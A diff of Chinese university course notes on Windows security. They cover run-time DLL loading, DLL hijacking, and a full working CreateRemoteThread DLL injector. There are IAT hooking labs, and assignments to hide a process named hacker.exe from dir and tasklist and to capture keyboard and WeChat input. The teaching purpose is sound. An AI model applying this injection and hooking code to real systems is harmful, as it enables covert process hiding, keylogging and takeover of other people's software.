@@ -803,10 +803,13 @@ int sub()
   * 当代码出现问题，要进行升级时，需要将所有调用这个函数的代码都升级一遍。如果单独放在一个文件中就只需要改这一个文件
   * 开发一个基础平台，不用开发源代码，用可以让更多人调用。起到了闭源系统同样能开放的功能
   * 没有动态链接，操作系统会异常臃肿和庞大，不宜升级和更新。能保证基础代码只有一个拷贝就可以。新编写的代码只是基础代码的增量。
-* 作业
-  * [Process Explorer](https://docs.microsoft.com/zh-cn/sysinternals/)
-  * [Dependency Walker](http://www.dependencywalker.com/)
+
+### 作业
+  * [Process Explorer](https://docs.microsoft.com/zh-cn/sysinternals/)                  
+  * [Dependency Walker](http://www.dependencywalker.com/)                      
   * 综合使用今天使用的模块遍历，结合三个工具dumpbin,Process Explorer,Dependency Walker结合分析比较
+
+  
 ### 编写DLL文件
 >[模块定义文件](https://docs.microsoft.com/en-us/cpp/build/reference/module-definition-dot-def-files?view=vs-2019)                         
 >[模块定义文件例子](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files?view=vs-2019)        
@@ -866,7 +869,8 @@ int main()
 ### 作业
 1. 会编写dll。把.c文件编译为obj文件，把obj文件和lib文件链接为新的dll和lib文件。注意使用def文件定义导出函数。
 2. 编写一个exe，调用第一步生成的dll文件中的导出函数。方法是（1）link是，将第一步生成的lib文件作为输入文件。（2）保证dll文件和exe文件在同一个目录，或者dll文件在系统目录。
-3. **第二步调用方式称为load time 特点是exe文件导入表中会出先需要调用的dll文件名及函数名，并且在link 生成exe是，需明确输入lib文件。还有一种调用方式称为 run time。参考上面的链接，使用run time的方式，调用dll的导出函数。包括系统API和第一步自行生成的dll，都要能成功调用。[参考资料](https://docs.microsoft.com/zh-cn/windows/win32/dlls/using-run-time-dynamic-linking)**
+3. **第二步调用方式称为load time 特点是exe文件导入表中会出先需要调用的dll文件名及函数名，并且在link 生成exe是，需明确输入lib文件。还有一种调用方式称为 run time。参考上面的链接，使用run time的方式，调用dll的导出函数。包括系统API和第一步自行生成的dll，都要能成功调用。
+[参考资料](https://docs.microsoft.com/zh-cn/windows/win32/dlls/using-run-time-dynamic-linking)**
 4. 提示
 >link /dll /def:xxx.def 
 >
@@ -876,6 +880,216 @@ int main()
 >
 >dumpbin /imports xxx.exe
 
+## **第十二节课(2019.12.23)**
+### Run time
+>[Using Run-Time Dynamic Linking](https://docs.microsoft.com/zh-cn/windows/win32/dlls/using-run-time-dynamic-linking)
+>[LoadLibrary ](https://docs.microsoft.com/zh-cn/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya?redirectedfrom=MSDN)
+>[DLL mian](https://docs.microsoft.com/zh-cn/windows/win32/dlls/dllmain?redirectedfrom=MSDN)
+### DLL mian
+1. 在./EXP/base1中加入[下列代码](https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-entry-point-function)
+![](./img/23chan.png)                
+![](./img/23jia.png)            
+2. 新建
+>D:\YearJunior1\SoftwareProjectSecurityDevelopmentLifecycle\EXP5\loader
+```cpp
+#include <Windows.h>
+// 数据类型，函数指针类型
+typedef int (WINAPI* MY_PROC)(char*);
+
+int main()
+{
+	HMODULE hBaselib = LoadLibraryA("baselib.dll");
+
+	if (hBaselib == NULL)
+		return 0;
+
+	MY_PROC func = (MY_PROC)GetProcAddress(
+			hBaselib, "lib_function");
+	func("run time load");
+}
+```
+### 代码注入（技术关键词：dll inject）
+* 流程图
+![](./img/23liuc.png)              
+* DLL劫持
+  * 加载dll,如果当前目录下有，就加载；如果没有，就去系统文件夹下查找
+  * hacker在当前目录下放一个kernel32.dll，然后这个kernel32.dll会再去load系统下的kernel32.dll
+> [dll inject git-hub参考](https://github.com/fdiskyou/injectAllTheThings)
+> [CreateRemoteThread function](https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread?redirectedfrom=MSDN)
+
+> [CreateRemoteThread dll inject 参考代码](https://github.com/fdiskyou/injectAllTheThings/blob/master/injectAllTheThings/t_CreateRemoteThread.cpp)、
+```cpp
+#include <stdio.h>
+#include <Windows.h>
+#include <tlhelp32.h>
+#include "fheaders.h"
+
+DWORD demoCreateRemoteThreadW(PCWSTR pszLibFile, DWORD dwProcessId)
+{
+	// Calculate the number of bytes needed for the DLL's pathname
+	DWORD dwSize = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);
+
+	// Get process handle passing in the process ID
+  //PROCESS_VM_WRITE,    //对内存进行写入
+	HANDLE hProcess = OpenProcess(
+		PROCESS_QUERY_INFORMATION |
+		PROCESS_CREATE_THREAD |
+		PROCESS_VM_OPERATION |
+		PROCESS_VM_WRITE,    
+		FALSE, dwProcessId);
+	if (hProcess == NULL)
+	{
+		wprintf(TEXT("[-] Error: Could not open process for PID (%d).\n"), dwProcessId);
+		return(1);
+	}
+
+	// Allocate space in the remote process for the pathname
+  // 给这段进程分配一个内存
+  // VirtualAlloc给别的进程分配内存
+	LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+	if (pszLibFileRemote == NULL)
+	{
+		wprintf(TEXT("[-] Error: Could not allocate memory inside PID (%d).\n"), dwProcessId);
+		return(1);
+	}
+
+	// Copy the DLL's pathname to the remote process address space
+	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);
+	if (n == 0)
+	{
+		wprintf(TEXT("[-] Error: Could not write any bytes into the PID [%d] address space.\n"), dwProcessId);
+		return(1);
+	}
+
+	// Get the real address of LoadLibraryW in Kernel32.dll
+	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+	if (pfnThreadRtn == NULL)
+	{
+		wprintf(TEXT("[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n"));
+		return(1);
+	}
+
+	// Create a remote thread that calls LoadLibraryW(DLLPathname)
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
+	if (hThread == NULL)
+	{
+		wprintf(TEXT("[-] Error: Could not create the Remote Thread.\n"));
+		return(1);
+	}
+	else
+		wprintf(TEXT("[+] Success: DLL injected via CreateRemoteThread().\n"));
+
+	// Wait for the remote thread to terminate
+	WaitForSingleObject(hThread, INFINITE);
+
+	// Free the remote memory that contained the DLL's pathname and close Handles
+	if (pszLibFileRemote != NULL)
+		VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);
+
+	if (hThread != NULL)
+		CloseHandle(hThread);
+
+	if (hProcess != NULL)
+		CloseHandle(hProcess);
+
+	return(0);
+}
+```
+
+### 作业
+1. 查文档，研究远程线程方式注入dll的实例代码的实现原理。
+2. 运行实例代码，向一个目标程序（比如notepad.exe)注入一个我们自行编写的dll，加载运行
+3. 整合进程遍历的程序，使得攻击程序可以自己遍历进程得到目标程序的pid。
+
+### 典型的恶意行为
+* 下载执行
+* 恶意软件
+
+## **第十三节课(2019.12.23)**
+### API hook
+* 授课内容：dll 注入+API hook技术实现对软件行为的篡改，是实现文件或者进程隐藏，外挂等的基础技术。
+* 重点内容IAT hook 是API hook的一种，API hook是通过修改函数的地址从而达到篡改程序行为的一种技术。
+* IAT : 导入地址表
+* hook技术通常与注入技术配合使用。
+### 实验
+> [PE Format](https://docs.microsoft.com/zh-cn/windows/win32/debug/pe-format)
+![](./img/peformat.bmp)           
+* 可以解析PE 文件的工具： dumpbin /headers 、 PE explorer
+>D:\YearJunior1\SoftwareProjectSecurityDevelopmentLifecycle\EXP5\loader
+1. 加一行```MessageBoxA(0,0,0,0)```
+![](./img/23add.png)              
+2. 会发现指针地址和指针所存的地址相差很多，快有两个2G了
+3. LoadLibary指针所指地址里面的就是导入表
+![](./img/23daorubiao.png)               
+* 导入表的位置是固定的，但是表里的值是可以变化的。调用的时候读入的是一个指针。系统函数的地址和主调函数之间的一种寻址的机制                     
+![](./img/23bubian.png)               
+4. 开发者工具解析loader.exe
+```cpp
+cd D:\YearJunior1\SoftwareProjectSecurityDevelopmentLifecycle\EXP5\loader\Debug
+d:
+dumpbin /headers loader.exe
+```
+时间戳就是1970年到现在的时间                      
+![](./img/23tine.png)              
+5. PE Exproer解析                  
+![](./img/23pe.png)                
+### IAT hook
+* 解构文件来找到系统文件所在的地方。信箱是没有加锁，谁都可以进行读和写
+* 修改了这个地址，到时候运行的时候一call，就运行到了一个假的地址，就被劫持
+* IAT hook原理就是替换IAT表中原本村的真实的系统地址，导致调用的时候调用了一个假的地址
+>[IAT hook 实例代码](https://github.com/tinysec/iathook)
+* 讲解IATHook.c
+![](./img/23hexin.png)            
+![](./img/231.png)              
+![](./img/232.png)              
+相对位置＋文件头的基地址就能得到最终的绝对地址                     
+![](./img/233.png)                 
+![](./img/234.png)               
+#### 代码实验
+1. git clone  https://github.com/tinysec/iathook.git
+2. 将readme.md复制为main.c,不是代码的部分删掉
+3. 开发者工具，转到目录D:\YearJunior1\SoftwareProjectSecurityDevelopmentLifecycle\EXP5\IAT\iathook
+4. ```cl /c IATHook.c```,```cl /c main.c```
+5. ```link main.obj IATHook.obj user32.lib /out:IAT.exe```
+
+![](./img/23iat.png)              
+6. ```IAT.exe```运行一下
+![](./img/23tan.png)           
+![](./img/23tan2.png)               
+7. 新建一个工程D:\YearJunior1\SoftwareProjectSecurityDevelopmentLifecycle\EXP5\Hook
+wmain ,iathook,下断点，和中间的MEssageBoxA中间也下断点。执行到message，会发现这个位置改变
+![](./img/23cha2.png)                
+
+![](./img/)            
+![](./img/)              
+![](./img/)              
+![](./img/)               
+![](./img/)                
+![](./img/)            
+![](./img/)              
+![](./img/)              
+![](./img/)               
+![](./img/)              
+![](./img/)           
+![](./img/)               
+![](./img/)                
+![](./img/)            
+![](./img/)              
+![](./img/)              
+![](./img/)               
+![](./img/)                
+![](./img/)            
+![](./img/)              
+![](./img/)              
+![](./img/)               
+![](./img/)              
+![](./img/)           
+![](./img/)               
+![](./img/)                
+![](./img/)            
+![](./img/)              
+![](./img/)              
+![](./img/)               
 ![](./img/)                
 ![](./img/)            
 ![](./img/)              
@@ -890,7 +1104,17 @@ int main()
 ![](./img/)              
 ![](./img/)               
 
-
 ## 参考资料
 * [intel手册](https://www.intel.cn/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-1-manual.pdf)
 * [Windebug课件](https://anjingcuc.github.io/courses-wiki/substitute/windbg/)
+
+## 大作业
+线程注入技术和IATHook综合应用（记事本，dir,计算器) 
+1. hook writefile,自己调用writefile(首先create WRItefilr)，使得每次写文件haha->hehe
+2. 把hook writefile 写为dll通过今天下午的实例代码，把他注入到notepad类似进程中，进行hook
+3. 试验一下hook是否成功
+4. 同样原理可以改 find firstfile和 nextfile,注入cmd,输入dir,只要输出hacker.exe就将磨掉
+5. 让系统的进程，Pass Maneger,tasklist遍历不到hacker.exe这样的进程
+6. 计算器 setwindowstext，不改输出，但是记录计算器的输出，实现屏幕取词。
+7. 接管其他进程，比如键盘输入，微信进程文本框输入
+
